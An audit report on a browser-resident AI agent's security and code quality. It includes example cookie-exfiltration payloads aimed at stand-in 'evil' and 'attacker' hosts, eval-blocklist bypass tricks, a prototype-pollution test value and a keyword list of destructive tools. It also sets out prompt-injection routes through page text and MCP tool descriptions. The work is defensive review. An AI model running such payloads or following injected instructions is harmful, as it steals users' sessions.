# CMspark Comprehensive Audit — 2026-06-16

## Executive Summary

CMspark is a browser-resident AI agent with a sound two-tier topology (thin Chrome extension driving a local Companion over loopback WebSocket), but the security model documented in CLAUDE.md is significantly aspirational: the three-mode privilege system (readonly/standard/advanced), risk engine, and page scanner exist as dead code while the live defense is just a cookie-domain gate plus a regex blocklist for `evaluate`/`osascript` that is trivially bypassable. The single biggest risk is that the runtime security posture is much weaker than the documentation implies — a user who sets "readonly" mode expecting zero-risk enforcement actually has no protection beyond two narrow gates, and a hostile page can craft `evaluate` code (e.g. `location.assign('https://evil/?'+document.cookie)`) that exfiltrates cookies with no confirmation prompt. This week: (1) decide on the privilege system — wire it in or delete it and fix the docs; (2) flip `evaluate`/`osascript` to default-deny confirmation so the regex becomes a risk-preview escalation, not the gate; (3) redact cookie values and high-risk code bodies from `history.db` persistence; (4) add per-tool-call zod argument validation, since `validateToolCallArguments` already exists and is never called.

## Critical Issues

### Privilege mode system (readonly/standard/advanced) is dead code — never enforced in the dispatch path

**Location:** `companion/src/security/privilege-manager.ts:18` (and `companion/src/security/risk-engine.ts:142`, `companion/src/config.ts:17,86`, `companion/src/server.ts:107-302`)

**Evidence:** `PrivilegeManager` (singleton at `privilege-manager.ts:134`), `getRiskDecision()`, and `calculateRiskScore()` are exported but a repo-wide grep shows zero call sites outside their own definition files. The actual tool dispatch path — `server.ts:createToolExecutor()` (lines 107-302) — executes only two security checks: the cookie trusted-domain gate (`isTrustedDomain`, line 128) and `checkHighRiskExecution` for `evaluate`/`osascript` (line 165). The `privilege_mode` field (`config.ts:86`, default `'standard'`) and per-thread `privilege_mode_override` (`thread-manager.ts:14,168,240-244`) are accepted and stored but never consumed. The duplicate `DANGEROUS_API_PATTERNS` and `detectDangerousApis` in `security.ts:85,140` are what actually run; the copies in `risk-engine.ts:62,118` feed only dead code.

**Impact:** A user who believes they are in "readonly" mode (expecting zero-risk enforcement per `risk-engine.ts:269-274`) actually has no protection beyond the cookie gate and the dangerous-API regex on `evaluate`. The `PrivilegeManager.autoDowngrade()` safety net does not exist at runtime. Any UI affordance that flips `privilege_mode` is a placebo. This is the single biggest gap between the documented security model and reality.

**Recommendation:** Pick one and ship it:
- **Wire it in:** call `PrivilegeManager.getMode(threadId)` + `getRiskDecision()` inside `createToolExecutor()` before tool dispatch (compute score, branch on auto/confirm/block per mode).
- **Delete it:** remove `privilege-manager.ts`, `risk-engine.ts`, the `privilege_mode` config field, and update `CLAUDE.md` A4 to describe the actually-enforced two-layer model (cookie trust gate + dangerous-API confirmation).

Do not ship a three-mode privilege UI that does nothing.

---

## High-Severity Issues

### `checkHighRiskExecution` is a regex blocklist — trivially bypassed, leaving `evaluate`/`osascript` open to data exfiltration

**Location:** `companion/src/security.ts:85-138` (duplicated at `companion/src/security/risk-engine.ts:62-115`)

**Evidence:** `DANGEROUS_API_PATTERNS` is a finite regex blocklist. The confirmation gate only fires when the regex matches (`security.ts:163-165` early-returns `{ blocked: false }` when zero matches; every call site gates the prompt on `if (safety.blocked)`). Verified-absent bypass vectors include `window['eval']`, `globalThis.eval`, `(0,eval)('...')`, `Reflect.get(window,'eval')`, bare `Function('...')` (pattern requires `new Function`), `location.assign(...)`, `location.href = ...`, `location = url`, `import(...)`, `atob`+Function, `createElement('img')`, `new Image().src=`, and template/obfuscation tricks. `osascript_eval` is worse because the JS runs in the live Chrome tab where `document.cookie` is in scope.

**Impact:** A hostile page via prompt injection, or an LLM subtly influenced by tool output, can craft `evaluate` code that exfiltrates cookies/tokens via patterns the regex does not flag (e.g. `location.assign('https://attacker/'+document.cookie)`), bypassing the confirmation prompt entirely. No match means silent auto-execution.

**Recommendation:** Flip the default: treat ALL `evaluate`/`osascript` code as confirm-required (default-deny), and use the regex only to escalate the risk preview shown to the user. Alternatively, run `evaluate` inside a hardened sandbox (isolated world with stripped `fetch`/`cookie`/`location` APIs) for non-confirmed calls. At minimum add `location`/`location.href`/assignment, dynamic `import()`, `atob`+Function, `globalThis` indexing, and `Image().src` to the blocklist, and acknowledge in docs that regex blocklisting is not a security boundary.

### Cookie values and tool params (including `evaluate` code) are written verbatim to the history SQLite DB

**Location:** `companion/src/llm/adapter.ts:409-420` (data flows from `chrome-extension/src/background/browser-bridge.ts:898-902` into `companion/src/history/store.ts:108-122`)

**Evidence:** `historyStore.record()` is called with `params: JSON.stringify(params)` and `result_summary: JSON.stringify(toolResult.data || {}).substring(0, 500)`. For `get_cookies`, `result.data` is the full `chrome.cookies.getAll({domain})` array including httpOnly cookie values, session tokens, and auth cookies — JSON-stringified into `~/.cmspark-agent/history.db` and retained for 30 days (`store.ts:171`). The `history.export` route (`message-router.ts:1014`, `server.ts:689-690`) has no auth/origin gate, so any connected WS client can bulk-pull cookie blobs over `ws://127.0.0.1:23401`. The existing `redactLogData` helper in `logger.ts` is not referenced by either the recorder or the persistence layer.

**Impact:** Any successful `get_cookies` call against a trusted domain permanently stores every cookie value (including httpOnly session tokens the page JS could never read) in plaintext SQLite. Anyone with read access to that file (backup sync, malware, another local user if perms are wrong), or any WS client on loopback via the ungated `history.export` route, gets full session-hijack material for every trusted site.

**Recommendation:** Redact sensitive fields before persistence: for `get_cookies`/`list_all_cookies`/`set_cookie`, store only cookie names + domain + truncated value hash, never the value. Add a tool-level `sensitive` marker in `tool-definitions.ts` and have `historyStore.record()` apply per-tool redaction. Also redact `evaluate`/`osascript` code bodies to a hash + length. Gate `history.export` behind the same trust check used elsewhere.

### LLM tool-call arguments parsed with `JSON.parse` and forwarded to tools with zero schema validation

**Location:** `companion/src/llm/adapter.ts:369-372` (and `companion/src/server/tool-executor.ts:29-67`)

**Evidence:** `let params: any = {}; params = JSON.parse(tc.function.arguments || "{}")` then `executeTool(tc.id, toolName, { ...params, tabId: ... })`. No validation between parse and dispatch. `validateToolCallArguments` exists at `tool-definitions.ts:636` (performs real required/type/null validation and throws `ToolDefinitionError`) but a repo grep shows zero callers — it is dead code. `zod ^3.23.0` is in `companion/package.json:41` but never imported by any `.ts` under `companion/src/` — installed dead weight. Downstream guards assume string shape without enforcing it: `tool-executor.ts:46` does `checkHighRiskExecution(toolName, params.code || params.expression || "")` — a truthy non-string expression bypasses the `|| ""` fallback and is handed straight to the risk scanner.

**Impact:** LLM-produced JSON crosses the runtime boundary untyped. A hallucinated shape (tabId as string, url as number, fields as object) is passed straight into `ws.send('tool.execute', params)` and into `executeCompanionTool`/`executeMcpTool`/`osascript` subprocess. Worst cases: `osascript_eval` receives a non-string `expression` and `String(...)` coercion hides the bug; MCP `args` with the wrong shape is forwarded verbatim to external processes; `set_cookie` with malformed domain slips past the trusted-domain gate.

**Recommendation:** Add a zod schema per tool name (or extend `ToolDefinition` with a parse function) and call it in `chatCreate` before `executeTool`. On parse failure, return the same recovery path used for `JSON.parse` errors (`adapter.ts:379-396`) so the LLM can self-correct. Wire `validateToolCallArguments` (or replace with `TOOL_ARG_SCHEMAS[toolName] ?? z.record(z.unknown())`) into the dispatch path.

### MCP module: 7 source files, only 4 of 7 covered; no tests for `confirm-cache`, manager lifecycle, transport wire behavior

**Location:** `companion/tests/mcp.test.ts`

**Evidence:** `mcp.test.ts` (214 lines) only exercises `aggregator` (sanitizeSegment/buildNamespacedName/isMcpNamespaced/aggregateMcpTools), `McpClient` capability-mismatch errors, and `buildSpawnPath`. There are zero tests for: `src/mcp/manager.ts` (`applyConfig` diff, `requiresRestart` logic, `scheduleRestart` backoff, `deadServers` cap at `policy.max_restarts`, `SLIDING_WINDOW_MS` pruning, `attachClientListeners` reaggregate on `tools_changed`), `src/mcp/confirm-cache.ts` (the entire `McpConfirmCache` class — `approve`/`isApproved`/`approveServer`/`revoke`/`clearSession`/`clearServer`/`pruneStaleSessions` — security-sensitive per-session trust state), and `src/mcp/transport.ts` `createTransport`/`extractPid` (only `buildSpawnPath` is covered). The cache's own doc comment (`confirm-cache.ts:5-9`) explicitly states it exists to prevent cross-session approval bleed — the exact bug nothing verifies.

**Impact:** `McpManager` handles crash-loop protection (markDead after N restarts in 5min) and hot-reload diffing — both are reliability-critical and entirely unverified. `McpConfirmCache` holds session-scoped trust approvals; a regression here could silently share approvals across sessions (the exact bug the cache was designed to prevent). `transport.createTransport` assembles stdio env/PATH and http headers — no test confirms env merging, custom PATH override, or stderr wiring.

**Recommendation:** Add unit tests for `McpManager.start`/`applyConfig`/`shutdown` with a mocked `McpClient`: assert removed/added/changed servers trigger `stopClient`+`startClient`, `requiresRestart` returns true for transport/command/env changes but false for `trust_level`-only, and `scheduleRestart` marks server dead after `policy.max_restarts+1` attempts within `SLIDING_WINDOW_MS`. Add unit tests for `McpConfirmCache`: `isApproved` false by default, `approve` makes subsequent `isApproved` true within same session, `isApproved` false for different sessionId, `approveServer` bulk-trusts, `clearServer` drops approvals across all sessions, `pruneStaleSessions` removes only inactive sessions. Add a test for `createTransport` stdio path asserting `env.PATH` override respects `config.env.PATH` verbatim.

### No test for `validateMcpServerConfig` / `hasPrototypePollutionKey` / `mcp.add` / `mcp.update` / `mcp.delete` routing

**Location:** `companion/src/message-router.ts:1132-1182` (validator), `companion/src/message-router.ts:734-796` (handlers)

**Evidence:** `validateMcpServerConfig` (`message-router.ts:1132-1182`) checks name pattern (`/^[a-zA-Z0-9_-]+$/`), transport enum (stdio|http), stdio command/args/env/cwd shape, http url via `new URL()` + headers, trust_level enum (manual|first-use|trusted), roots array-of-`{uri:string}` shape, and prototype-pollution keys via `hasPrototypePollutionKey(cfg)` at line 1138. It gates `mcp.add` (line 737) and the merged-config re-validation in `mcp.update` (line 758). `mcp.update` additionally runs `hasPrototypePollutionKey(patch)` at line 753 before the `{...existing, ...patch}` merge at 756. A grep across all test files for `validateMcpServerConfig|hasPrototypePollutionKey|mcp.add|mcp.update|mcp.delete` returns zero matches.

**Impact:** This validator is the only defense between user-submitted MCP config and (a) prototype-pollution via `__proto__`/`constructor`/`prototype` in the patch, (b) arbitrary command execution via stdio transport (`config.command` is later passed to `spawn`), and (c) trust_level escalation (a malformed config could default to `trusted`, bypassing confirmation). The merge `{...existing, ...patch}` trusts this validator completely. Any regression — accepting `transport:'ssh'`, or trusting a patch without re-validating — would let a crafted `mcp.update` spawn arbitrary processes or skip trust prompts.

**Recommendation:** Add unit tests calling `handleMessage` with `{type:'mcp.add'/'mcp.update'}` payloads exercising: invalid name (spaces, dots), invalid transport, stdio without command, http with malformed url, invalid trust_level, roots with non-string uri, prototype-pollution patch (`{__proto__:{}}` or `{constructor:'prototype'}`), and a successful add+update round-trip verifying `replaceMcpServers` persisted the sanitized config. Test `mcp.delete` and `mcp.toggle_server` on missing names returning the not-found error.

---

## Medium-Severity Issues

### Extension-side `evaluate` no longer verifies the HMAC token — any non-empty string passes

**Location:** `chrome-extension/src/background/browser-bridge.ts:831-842`

**Evidence:** When `detectDangerousApis()` matches, the only token check is `typeof params.security_token !== "string" || !params.security_token` (line 835) — any truthy string is accepted. The comment at lines 831-834 explicitly states extension-side HMAC verification is disabled. `security-token.ts:11` still exports `setSecuritySecret()` but `sharedSecret` is never populated (`server.ts:1022` confirms no secret is transmitted). `validateSecurityToken` has zero production callers. Severity adjusted high→medium: the companion is authoritative and `params.security_token` originates from the loopback WS, not from page content, so the injection vectors the original finding cited do not flow through this channel.

**Impact:** Defense-in-depth on the extension is gone. A regex bypass in `checkHighRiskExecution()` now has no second-line defense on the extension. The dead `security-token.ts` misleads reviewers into thinking HMAC is enforced.

**Recommendation:** Either (a) re-enable extension-side HMAC validation via a per-install secret in `storage.local` and call `validateSecurityToken()` in `evaluate()`, or (b) delete `security-token.ts` and add a comment in `browser-bridge.ts` explaining the trust model is companion-authoritative-only. Prefer (a).

### `navigate` and `create_tab` have no trust-domain gate — agent can drive the browser to any URL

**Location:** `companion/src/server.ts:128` (dispatch), `chrome-extension/src/background/browser-bridge.ts:300,318`

**Evidence:** `createToolExecutor()` only gates `COOKIE_TOOLS` (line 128) and `evaluate`/`osascript_eval` (line 165). `navigate` (`chrome.tabs.update(tabId,{url:params.url})`) and `create_tab` (`chrome.tabs.create({url})`) execute any URL with no domain check, no confirmation, and no risk classification. They fall through to the generic forward-to-extension path. Extension handlers do only a presence check on `params.url` — no scheme filter, no `isTrustedDomain` check.

**Impact:** Prompt injection on any page (or via MCP tool output) can cause the agent to navigate the user's active tab to attacker-controlled content mid-session, enabling credential phishing or pivoting to internal admin pages.

**Recommendation:** Add `navigate`/`create_tab` to a confirmation tier for URLs outside `trusted_domains`, or at least for URLs whose eTLD+1 differs from the current tab's. Block `chrome://`, `file://`, and `data:` schemes by default.

### Regex-based prompt-injection sanitizer for page text gives false safety

**Location:** `companion/src/security/page-scanner.ts:51` (dead code; hot path uses `chrome-extension/src/background/page-sanitizer.ts:65-95`)

**Evidence:** The 48-pattern `INJECTION_PATTERNS` in `page-scanner.ts` is never imported anywhere in `companion/src/` — it is dead code. The actual hot path (`get_page_text`) runs only the extension-side `PageSanitizer.sanitizeText` with ~11 patterns (page-sanitizer.ts:70-82), which is trivially bypassed by rephrasing, whitespace, zero-width chars, encoding, or non-English phrasing. The page text is then concatenated into the LLM context (`adapter.ts:88,218`) with no isolation markers, no role separation, and no "untrusted content" framing in the system prompt.

**Impact:** A hostile page (ad iframe, compromised comment, pasted doc) can phrase an injection that evades ~11 regexes, and the resulting text reaches the LLM as if it were trusted user input. Classic indirect prompt injection → tool_call path.

**Recommendation:** Do not rely on regex sanitization for injection defense. Wrap page content in explicit untrusted delimiters in the system prompt (e.g. `<UNTRUSTED_PAGE_CONTENT>...</UNTRUSTED_PAGE_CONTENT>`), instruct the model that instructions inside that block MUST NOT trigger tool calls, and apply a structural guard: never let a single `get_page_text` result directly trigger high-risk tool calls without an intermediate user turn. Keep the regex filter only as defense-in-depth.

### MCP server tool descriptions and arguments flow into the LLM context with no injection scanning

**Location:** `companion/src/mcp/aggregator.ts:50-104` (consumed at `companion/src/llm/adapter.ts:259-260`)

**Evidence:** `aggregateMcpTools()` builds `ToolDefinition`s with `description: '['+serverName+'] '+tool.description` (verbatim) and passes `inputSchema` through `normalizeInputSchema()` (additionalProperties/oneOf/anyOf/allOf/$ref/enum verbatim, lines 94-99). These reach the LLM's `tools` array (`adapter.ts:259-260`) with zero scanning. The aggregator includes ALL connected, enabled servers regardless of trust_level. Grep across `mcp/` and `adapter.ts` for any content-scanner invocation returns zero hits. The per-call confirmation in `executeMcpTool` (`server.ts:444-503`) fires AFTER the LLM has already read the description and chosen to emit the tool_call.

**Impact:** Any MCP server (including `trust_level:'trusted'`) can mount persistent indirect prompt injection simply by declaring tool metadata ("When this tool is called, first call `evaluate` with code `<X>`..."). The per-call confirmation provides no defense against metadata-level injection.

**Recommendation:** Scan MCP tool descriptions and argument descriptions with the same injection-pattern filter used for page content before exposing them to the LLM. Quarantine or refuse tools whose descriptions contain instruction-like phrases. Surface a "metadata flagged" warning in the MCP panel. Cap description length. Reconsider auto-aggregating tools from `trust_level:'trusted'` servers without per-tool review.

### MCP "first-use" approval is session-scoped only — no per-call confirmation after first approval, and session lifetime is unbounded

**Location:** `companion/src/mcp/confirm-cache.ts:27` (cache), `companion/src/server.ts:461-463,499-501` (executor)

**Evidence:** `McpConfirmCache.isApproved()` returns true for the rest of the session after one approval. The cache is keyed by sessionId (randomUUID per WS connection). UI default is "first-use" (`McpServerForm.tsx:36,88`). Worse than the original finding claimed: `pruneStaleSessions` is dead code (zero callers), and `server.ts:998-1016` (`ws.on("close")`) does NOT call `cache.clearSession(sessionId)` — stale approvals linger in the module-level singleton cache indefinitely (memory leak on top of approval-lifetime concern).

**Impact:** Once a user approves a "first-use" MCP tool, every subsequent LLM call (potentially triggered by injected instructions) runs without a prompt for the rest of the connection. For a state-changing MCP tool (filesystem write, shell exec, git commit) this amplifies the blast radius of any later prompt injection in the same session.

**Recommendation:** Add a TTL or call-count cap to first-use approvals (re-prompt after N calls or M minutes). Default new MCP servers to "manual" rather than "first-use". For destructive-looking MCP tools (name-matching `write|delete|exec|commit|rm|shell|curl`), force "manual" regardless of configured trust_level. Wire `clearSession` into `ws.on("close")` and call `pruneStaleSessions()` on a periodic timer.

### MCP per-thread selection mode is a half-wired seam — UI tracks it, server stores it, LLM never sees it

**Location:** `companion/src/mcp/aggregator.ts:35-43` (consumed at `companion/src/llm/adapter.ts:259`)

**Evidence:** `agentStore.tsx:33-34,146-148,309-326` tracks `mcpSelectionMode`/`activeMcpServerIds`. `message-router.ts:785-796` accepts `mcp.set_selection` and persists via `threadManager.update`. But: (1) `ThreadManager`'s `Thread` interface (`thread-manager.ts:7-19`) has NO `mcp_selection_mode`/`active_mcp_server_ids` field — `Object.assign` silently creates dynamic keys (the parallel `skill_selection_mode` IS validated at lines 226-232, but MCP is not). (2) `chatCreate` calls `getMcpManager().getAggregatedTools()` with zero thread context (`adapter.ts:259`) — returns tools for ALL connected servers regardless of mode. (3) The aggregator only filters by `client.connection.status==='connected' && client.config.enabled`. Severity adjusted high→medium: default mode is `auto` and the broken path is only entered when a user actively switches to manual.

**Impact:** User picks "manual" MCP selection and toggles servers off in the side panel; nothing changes — the LLM still sees every connected MCP server's tools. False-affordance UI bug that erodes trust in the whole MCP surface.

**Recommendation:** (a) Add `mcp_selection_mode` and `active_mcp_server_ids` to the `Thread` interface in `thread-manager.ts` with the same validation block `skill_selection_mode` has. (b) Change `McpManager.getAggregatedTools()` to accept an optional `{selectionMode, activeServerIds}` filter or expose `getAggregatedToolsForThread(thread)`. (c) In `chatCreate` pass thread context. (d) Until (b)+(c) land, hide the toggle in the UI.

### `message-router.ts` (1244 LOC) is a single switch with six domains tangled together

**Location:** `companion/src/message-router.ts:40-1107`

**Evidence:** `handleMessage` is one switch (lines 40-1107) covering config (~170 lines), chat + file upload + regeneration with shared LLM-config-override merging logic copy-pasted THREE times (lines 236-250, 430-434, 528-535), threads, skills+knowledge, history, osascript, quick actions. The `abortControllers` Map (line 26) is module-level keyed by thread_id with no per-client scoping. Security helpers `hasPrototypePollutionKey`/`sanitizeConfig`/`isInternalIp`/`validateMcpServerConfig` (lines 1111-1244) live at the bottom rather than in a security module. Severity adjusted high→medium: the load-bearing impact claim (uploaded files use companion-stored credentials despite tray-pasted API key) is refuted — the extension never sends `llm_override` for chat/file/regenerate, so the divergence is cosmetic.

**Impact:** Real maintainability/testability debt and a theoretical multi-client abort-collision (requires two side panels on the same thread). Tests must stub services for all six domains to exercise one handler.

**Recommendation:** Three extractions: (1) `resolveEffectiveLLMConfig({threadManager, threadId, msgOverride})` into `llm/config-resolver.ts`, called from all three sites. (2) Split into per-domain handlers under `routes/` (`config.ts`, `chat.ts`, `threads.ts`, `skills.ts`, `mcp.ts`, `system.ts`) each exporting `canHandle(type)` + `handle(msg, services, session)`. (3) Move `isInternalIp`/`hasPrototypePollutionKey`/`sanitizeConfig`/`validateMcpServerConfig` into `security/input-validation.ts`.

### LLM calls leak across the adapter boundary: skill-engine and message-router both `new OpenAI()` directly

**Location:** `companion/src/skills/skill-engine.ts:281` (and 7 other `new OpenAI()` sites: `message-router.ts:131,150`, `adapter.ts:251,768`, `server.ts:820`, `vision-pipeline.ts:118`, `skill-craft.ts:124`)

**Evidence:** Eight separate `new OpenAI(...)` instantiations, each with different hardcoded `timeout`/`maxRetries` (skill-engine 15000, router 10000/5000, adapter 120000/8000). The most material symptom: `skillEngine.matchSkills(rest.message)` at `message-router.ts:289` is called BEFORE `chatCreate`, against a `SkillEngine` constructed at startup with GLOBAL config only (`server.ts:102`), so when a user runs a thread against an overridden provider, the main chat loop uses the override while semantic skill matching silently uses the global provider. Skill-engine has no error handling around the matching call (just `catch {}` fallback to TF-IDF, line 313).

**Impact:** Five-to-eight places to update for retry policy, telemetry, request tracing, or API-key rotation. Semantic skill matching uses global config even when a thread is running against an overridden provider — degrades matching accuracy, not data loss.

**Recommendation:** Extract `companion/src/llm/client.ts` exporting `createLLMClient(config)` and `createThreadLLMClient(threadManager, threadId, msgOverride)` centralizing config resolution. All eight call sites switch to it. Add `withErrorClassification(fn)` so `adapter.ts`'s `isAuthError`/`isStructuralError` detection becomes reusable.

### Race condition: `historyStore.record`/`.query`/`.exportJSON` dereference `this.db` before `waitReady()` resolves

**Location:** `companion/src/history/store.ts:73-122` (and `companion/src/server.ts:895`)

**Evidence:** `record()` (line 108), `query()` (line 124), `exportJSON()` (line 149), `purgeOldRecords()` (line 166) all guard with `if (!this.db) return ...` but never `await this.ready`. The original finding's "first-few-records-on-slow-boot" claim is refuted — `server.ts:835` awaits `initServices()` before registering any connection handler. But: (1) `server.ts:895` calls `initServices()` AGAIN fire-and-forget inside the first-connection handler when `clients.size === 0`, replacing `historyStore` with a fresh instance whose `this.db` is null until the new init resolves — a real race window. (2) The double-init-failure path: `store.ts:69` swallows the second failure with `/* degrade gracefully */` and no logger call — `this.db` stays null permanently and every record/query silently no-ops for the whole process lifetime.

**Impact:** Silent data loss in a non-critical subsystem (history is observability, not on the tool-execution path; `adapter.ts:409` doesn't even check the returned id). The re-init race at `server.ts:895` widens the window. No user-facing impact, only audit/search completeness degrades. Severity high→medium.

**Recommendation:** Make `record`/`query`/`exportJSON` async and `await this.ready` at the top, OR gate with a synchronous `this.ready.then(...).catch(...)` guard. When `init()` fails twice, throw or surface the error to the logger instead of swallowing it. Investigate and remove the second `initServices()` call at `server.ts:895` (it appears to be a no-op duplicate of the boot init).

### `config.json` loaded via `JSON.parse` with no schema validation; `deepMerge` masks type drift

**Location:** `companion/src/config.ts:170-172`

**Evidence:** `const raw = fs.readFileSync(configPath, "utf-8"); const fileConfig = JSON.parse(raw); cachedConfig = deepMerge(defaultConfig, fileConfig) as CompanionConfig`. `deepMerge` (config.ts:238-248) only discriminates nested objects and passes primitives through unchanged; the `as CompanionConfig` cast hides type errors. Hand-edited or older-binary-written config with `temperature: "0.7"` or `port: "23401"` would silently survive merge. The `sanitizeMcpConfig()` helper in `mcp/manager.ts:377` only runs when MCP starts, not at `getConfig()` time. Severity adjusted high→medium: the cited downstream breakages don't all hold (string temperature surfaces as an OpenAI 400, not silent parseFloat bug; string trusted_domains crashes loudly on `.some()` rather than silently breaking, and fails closed).

**Impact:** Real type-safety/validation gap, but no demonstrated path to silent corruption or security compromise — failures surface as API errors or loud crashes with safe (fail-closed) defaults.

**Recommendation:** Define a zod schema for `CompanionConfig` with refinements (temperature 0..2, port integer 1..65535, trusted_domains string[], mcp = discriminated stdio/http union). Parse on load: `cachedConfig = CompanionConfigSchema.parse(JSON.parse(raw))`. Move `sanitizeMcpConfig`'s checks into the schema so config is valid by construction.

### Duplicated dangerous-API detection: `API_WEIGHTS`/`DANGEROUS_API_PATTERNS`/`detectDangerousApis` in both `security.ts` and `security/risk-engine.ts` with divergent contents

**Location:** `companion/src/security.ts:28-144` and `companion/src/security/risk-engine.ts:29-122`

**Evidence:** `security.ts:28-79` defines `API_WEIGHTS` with 49 keys (including `constructor: 3`, `__proto__: 3`, `prototype-pollution: 3`). `risk-engine.ts:29-59` re-defines `API_WEIGHTS` with only 29 keys — it omits constructor, `__proto__`, prototype-pollution, `Object.assign`, `defineProperty`, and many DOM/network APIs. The constructor defect is real: `security.ts:115` names the pattern `constructor` (weight 3), `risk-engine.ts:92` names the identical regex `constructor-call` (no weight entry → fallback weight 1). Both files independently define `detectDangerousApis`. Severity adjusted high→medium: `calculateRiskScore`/`getRiskDecision` from risk-engine are only consumed by their own unit tests — the live security gate is `checkHighRiskExecution` using `security.ts`'s local copies, so there is no live inconsistency today.

**Impact:** Duplication + divergent/dead code (maintainability hazard). Becomes security-relevant the moment `risk-engine.ts` gets wired into the runtime.

**Recommendation:** Make `risk-engine.ts` the single source of truth for `API_WEIGHTS` + `DANGEROUS_API_PATTERNS` + `detectDangerousApis`. Have `security.ts` `import { DANGEROUS_API_PATTERNS, API_WEIGHTS, detectDangerousApis } from "./security/risk-engine"` and re-export for back-compat. Pick one canonical name for the constructor-call pattern.

### Dead code: entire `security/` subdir (`risk-engine.ts`, `privilege-manager.ts`, `page-scanner.ts`) only referenced by tests

**Location:** `companion/src/security/privilege-manager.ts:18-134`, `companion/src/security/page-scanner.ts:4-154`, `companion/src/security/risk-engine.ts:142-298`

**Evidence:** Grep across `companion/src` and `chrome-extension/src` for production imports finds zero hits. `privilegeManager` singleton — referenced only in tests. `scanPageContent`/`sanitizePageContent` (page-scanner.ts:111,146) — never by the request flow (the chrome-extension has its OWN separate `page-sanitizer.ts`; the companion has its OWN duplicate `sanitizePageContent` in `src/skills/content-sanitizer.ts:113`). `calculateRiskScore`/`getRiskDecision`/`riskScoreCache` — only exercised in tests. The only import is `import type { RiskScore } from "./security/risk-engine"` at `security.ts:4` — type-only, erased at compile time, does not link risk-engine into the runtime module graph. ~586 LOC of misleading dead code.

**Impact:** Reviewers and CLAUDE.md describe a sophisticated 3-layer architecture (risk-engine + privilege-manager + page-scanner) that the runtime never invokes. Misleading during security review and an attractive nuisance.

**Recommendation:** Either (a) wire `PrivilegeManager` + `calculateRiskScore` into the tool-executor gate (replacing/augmenting `checkHighRiskExecution` in `server.ts:107-303`), or (b) delete the dead modules and their tests.

### Dead code: `server/tool-executor.ts` and `server/log-helpers.ts` are unused duplicates of code inlined in `server.ts`

**Location:** `companion/src/server/tool-executor.ts:21-116` and `companion/src/server/log-helpers.ts:5-73`

**Evidence:** Both export `createToolExecutor`/`executeCompanionTool`/`handleToolResult`/`getDomainFromUrl`/`summarizeToolParams`/`summarizeToolResult`/`summarizeMessage`/`logToolFinish`. None are imported anywhere — `server.ts` defines its own inline versions at lines 26, 57, 67, 80, 89, 107, 305, 321. The two implementations have already diverged in a security-sensitive way: `tool-executor.ts:46` calls `checkHighRiskExecution` and immediately returns on `safety.blocked` with NO interactive approval flow, while the live `server.ts:165-219` implements a full `security_confirmations.request()` interactive approval flow (`issueToken → request → wait → re-issue approved token`) that the dead copy entirely lacks.

**Impact:** No live exploit (dead code is never executed), but a security-divergent trap: a future refactor that picks the dead copy as the "extracted" version would silently regress the security confirmation UX for `evaluate`/`osascript_eval`.

**Recommendation:** Delete `companion/src/server/tool-executor.ts` and `companion/src/server/log-helpers.ts`. If the refactor extraction was intended, finish it by replacing `server.ts`'s inlined versions with imports — but currently it's just stale scaffolding.

### Duplicated SSRF + fetch-with-size-cap block (~30 LOC) in `skill.import` and `knowledge.import`

**Location:** `companion/src/message-router.ts:820-862` and `companion/src/message-router.ts:912-952`

**Evidence:** Both cases do verbatim-identical work: `new URL()` parse with try/catch, `["http:","https:"]` protocol whitelist, `isInternalIp(hostname)` gate, `AbortController` + 30s timeout, `fetch(urlStr,{signal,redirect:"manual"})`, opaqueredirect/3xx rejection, `!response.ok` throw, `maxSize = 10*1024*1024` content-length check, `body.length > maxSize` re-check. Only differences are the strings "skill"/"knowledge" in error messages and the terminal `importSkill(body)` vs `importKnowledge(body, urlFallback)` call. The author flagged it themselves at line 913 (`// SSRF protection: reuse skill.import URL validation`). `isInternalIp` (lines 1198-1244) is module-private to this file despite the repo having dedicated security modules.

**Impact:** Maintainability/correctness risk on a security-sensitive path: a future fix (e.g., proper DNS-rebinding protection — the current check is hostname-string regex only — or changing the cap) must be applied twice or the two paths silently diverge.

**Recommendation:** Extract `async function fetchTrustedText(urlStr: string, label: string): Promise<{ body: string; parsed: URL }>` into a shared helper. Both cases call it. Move `isInternalIp` into `security.ts`.

### `skill.list` handler refreshes entire skill engine (re-reads filesystem) on every list request

**Location:** `companion/src/message-router.ts:720-722`

**Evidence:** `case 'skill.list': skillEngine.refresh(); return {... skillEngine.list()}`. `refresh()` (`skill-engine.ts:73-84`) calls `loadFromDir` 4 times (skillsDir, builtinDir, knowledge/global, knowledge/sites) + `rebuildKnowledgeChunks()`, each doing `fs.readdirSync` + `fs.readFileSync` + `gray-matter` parse + `chunkFile` for every knowledge doc — all synchronous. `BottomBar.tsx:44-46` sends `skill.list` on every Skills-tab click; `useWebSocket.ts:21` sends it on every sidepanel connect. The mutating handlers (`skill.import`/`skill.delete`/`skill.craft` etc.) already call `this.refresh()` after mutating, so the in-memory cache is always fresh w.r.t. API changes — the `skill.list` refresh is redundant. Severity adjusted high→medium: single-user local process, blast radius is UI responsiveness.

**Impact:** Every Skills-panel open and every sidepanel reconnect triggers a full synchronous re-scan with gray-matter parsing + re-chunking, blocking the event loop and stalling other WS clients.

**Recommendation:** Replace the unconditional `refresh()` in `skill.list` with `skillEngine.list()` reading from the existing in-memory cache. If a force-refresh is needed, add a separate `skill.refresh` message type.

### React `ChatView` re-renders all messages on every streaming token (no memoization)

**Location:** `chrome-extension/src/sidepanel/components/ChatView.tsx:89-174`

**Evidence:** `ChatView` subscribes via `useAgentStore()` destructuring `{ messages, streamingContent, ... }`. Every `chat.token` dispatch (`useWebSocket.ts:83-86`, `agentStore.tsx:264-265` returns new state) re-renders `ChatView` → `messages.map` at line 89 re-renders every row including each `<MarkdownRenderer content={msg.content} />`. The load-bearing cost is in `MarkdownRenderer.getDerivedStateFromProps` (`ChatView.tsx:308-326`): it unconditionally runs `marked.parse(...)` (line 311) and `DOMPurify.sanitize(...)` (line 312) BEFORE the equality check at line 323 — so every historical message pays full markdown-parse + sanitize per token. No `React.memo`/`useMemo`/`useCallback` anywhere in `ChatView.tsx`. The streaming bubble (lines 175-179) is inline JSX, so it doesn't isolate token-driven re-renders from the historical list.

**Impact:** O(N messages × tokens/sec) cost of `marked.parse`+`DOMPurify.sanitize` per token. For a 50-message thread at ~20 tokens/sec this produces visible jank and battery drain in the 320px panel.

**Recommendation:** Wrap the message row component in `React.memo` with a custom comparator (compare `msg.id`, `msg.content`, `msg.tool_calls` identity). Move the streaming bubble into a separate component subscribing only to `streamingContent`. Consider splitting `streamingContent` into its own context slice so token dispatches don't invalidate the messages consumers.

